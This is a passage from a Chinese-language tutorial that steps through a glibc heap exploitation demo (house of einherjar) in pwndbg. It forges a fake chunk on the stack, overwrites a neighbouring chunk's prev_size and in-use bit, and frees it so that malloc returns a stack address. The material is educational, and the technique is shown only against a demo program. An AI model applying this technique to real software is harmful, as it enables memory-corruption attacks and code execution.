   79     size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
 ► 80     fprintf(stderr, "Our fake prev_size will be %p - %p = %#lxn", b-sizeof(size_t)*2, fake_chunk, fake_size);

 ► 81     *(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size;

   83     //Change the fake chunk's size to reflect b's new prev_size
   84     fprintf(stderr, "nModify fake chunk's size to reflect b's new prev_sizen");
 ► 85     fake_chunk[1] = fake_size;

   89     free(b);
 ► 90     fprintf(stderr, "Our fake chunk size is now %#lx (b.size + fake_prev_size)n", fake_chunk[1]);

   104     d = malloc(0x200);
 ► 105     fprintf(stderr, "Next malloc(0x200) is at %pn", d);
```

好了，下面直接开始调试，首先是chunk a

```
pwndbg&gt; heap
0x603000 FASTBIN {
  prev_size = 0,
  size = 65,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603040 PREV_INUSE {
  prev_size = 0,
  size = 135105,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
```

然后在我们给我们的fake_chunk赋值之后

```
pwndbg&gt; p/x fake_chunk
$2 = {0x100, 0x100, 0x7fffffffe600, 0x7fffffffe600, 0x7fffffffe600, 0x7fffffffe600}
```

也就是

```
$3 = {
  prev_size = 256,
  size = 256,
  fd = 0x7fffffffe600,
  bk = 0x7fffffffe600,
  fd_nextsize = 0x7fffffffe600,
  bk_nextsize = 0x7fffffffe600
}
```

随后程序malloc了b

```
pwndbg&gt; heap
0x603000 FASTBIN {
  prev_size = 0,
  size = 65,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603040 PREV_INUSE {
  prev_size = 0,
  size = 257,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603140 PREV_INUSE {
  prev_size = 0,
  size = 134849,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
```

然后给a[real_a_size]赋0x00,也就是

```
pwndbg&gt; x/10gx 0x603048
0x603048:       0x0000000000000100      0x0000000000000000
0x603058:       0x0000000000000000      0x0000000000000000
0x603068:       0x0000000000000000      0x0000000000000000
0x603078:       0x0000000000000000      0x0000000000000000
0x603088:       0x0000000000000000      0x0000000000000000
```

之后设置fake_size为b和fake_chunk的差值

```
pwndbg&gt; p/x b-0x10
$16 = 0x603040
pwndbg&gt; p/x &amp;fake_chunk
$17 = 0x7fffffffe600
pwndbg&gt; p/x 0x603040-0x7fffffffe600
$18 = 0xffff800000604a40
pwndbg&gt;
```

之后程序将b的pre_size设为了fake_size

```
pwndbg&gt; heap
0x603000 FASTBIN {
  prev_size = 0,
  size = 65,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603040 {
  prev_size = 18446603336227506752,
  size = 256,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603140 PREV_INUSE {
  prev_size = 0,
  size = 134849,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
pwndbg&gt; p/x 18446603336227506752
$30 = 0xffff800000604a40
```

一切就绪之后,程序将fake_chunk的szie设为了fake_chunk

```
pwndbg&gt; p/x fake_chunk
$32 = {0x100, 0xffff800000604a40, 0x7fffffffe600, 0x7fffffffe600, 0x7fffffffe600, 0x7fffffffe600}
```

也就是

```
$34 = {
  prev_size = 0x100,
  size = 0xffff800000604a40,
  fd = 0x7fffffffe600,
  bk = 0x7fffffffe600,
  fd_nextsize = 0x7fffffffe600,
  bk_nextsize = 0x7fffffffe600
}
```

现在我们再free b,程序通过pre_size就会去找我们的fake chunk,又发现我们的fake_chunk也是free态,因此就会与我们的fake_chunk合并,现在我们再malloc的话

```
pwndbg&gt; p/x d-0x10
$39 = 0x7fffffffe600
```



## 总结

程序首先malloc了chunk a(0x38)

之后呢在栈上创建了fake chunk,并且伪造了fake chunk的结构

随后程序又malloc了chunk b(0xf8),b和top chunk相邻

我们计算量b和fake chunk的地址差后,将b的pre_size设为了我们的差值,并把b的pre_inuse置0,之后free掉了b

此时b就通过pre_size找到了我们的fake chunk并且与我们的fake chunk合并了,现在我们再申请一个chunk,就会从fake chunk那分配了

over~
